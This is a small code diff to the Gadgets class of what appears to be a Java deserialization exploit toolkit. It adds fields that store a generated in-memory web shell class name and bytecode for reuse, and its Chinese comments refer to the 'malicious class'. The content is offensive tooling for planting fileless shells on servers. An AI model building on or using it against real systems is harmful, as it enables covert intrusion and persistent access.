@@ -26,6 +26,10 @@ import org.apache.commons.lang.RandomStringUtils;
 })
 public class Gadgets {
 
+	public static String memShellClassname = "";
+
+	public static byte[] memShellClassBytes = null;
+
 	static {
 		// special case for using TemplatesImpl gadgets with a SecurityManager enabled
 		System.setProperty(DESERIALIZE_TRANSLET, "true");
@@ -303,6 +307,10 @@ public class Gadgets {
 
 		// 写入前将 classBytes 中的类标识设为 JDK 1.6 的版本号
 		classBytes[7] = 49;
+
+		// 储存一下生成的内存马类名及类字节码，用来给 TransformerUtil 用
+		memShellClassBytes = ctClass.toBytecode();
+		memShellClassname = ctClass.getName();
 
 		// 恶意类是否继承 AbstractTranslet
 		if (IS_INHERIT_ABSTRACT_TRANSLET) {
